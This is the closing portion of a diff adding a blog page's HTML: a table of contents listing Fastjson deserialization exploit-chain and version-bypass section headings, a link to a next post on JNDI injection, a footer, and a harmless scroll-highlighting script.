+<ul>
+<li><a href="#jdbcrowsetimpl">JdbcRowSetImpl</a>
+<ul>
+<li><a href="#jndirmi">JNDI+RMI</a></li>
+<li><a href="#jndildap">JNDI+LDAP</a></li>
+</ul>
+</li>
+<li><a href="#templatesimpl">TemplatesImpl</a></li>
+</ul>
+</li>
+<li><a href="#1225-1241%E7%BB%95%E8%BF%87">1.2.25-1.2.41绕过</a></li>
+<li><a href="#1242%E7%BB%95%E8%BF%87">1.2.42绕过</a></li>
+<li><a href="#1243%E7%BB%95%E8%BF%87">1.2.43绕过</a></li>
+<li><a href="#1245%E7%BB%95%E8%BF%87">1.2.45绕过</a></li>
+<li><a href="#1247%E7%BB%95%E8%BF%87">1.2.47绕过</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://bloyet.github.io/post/jndi-zhu-ru/">
+              <h3 class="post-title">
+                JNDI注入
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://bloyet.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
